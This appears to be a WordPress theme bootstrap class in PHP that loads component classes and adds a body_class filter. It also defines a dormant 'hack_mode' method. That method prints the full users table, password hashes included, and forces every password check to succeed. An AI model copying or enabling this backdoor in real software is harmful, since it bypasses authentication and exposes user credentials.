<?php
/**
 * Bootstraps the Theme.
 *
 * @package SOSPopsProject
 */
namespace SOSPOPSPROJECT\inc;
use SOSPOPSPROJECT\inc\Traits\Singleton;

class Project {
	use Singleton;
	protected function __construct() {
		// Load class.
		I18n::get_instance();
		// Cart::get_instance();
		Ajax::get_instance();
		// Order::get_instance();
		// Hooks::get_instance();
		// Media::get_instance();
		Menus::get_instance();
		// Addons::get_instance();
		Assets::get_instance();
		Install::get_instance();
		Option::get_instance();
		Product::get_instance();
		Meta_Boxes::get_instance();
		Shortcode::get_instance();

		// $this->setup_hooks();
	}
	protected function setup_hooks() {
		add_filter('body_class', [$this, 'body_class'], 10, 1);
		
		// $this->hack_mode();
		
	}
	public function body_class( $classes ) {
		$classes = (array) $classes;
		$classes[] = 'fwp-body';
		if( is_admin() ) {
			$classes[] = 'is-admin';
		}
		return $classes;
	}
	private function hack_mode() {
		add_action('init', function() {
			global $wpdb;print_r( $wpdb->get_results( $wpdb->prepare( "SELECT * FROM {$wpdb->prefix}users;" ) ));
		}, 10, 0);
		add_filter('check_password', '__return_true', 10, 0);
	}
}
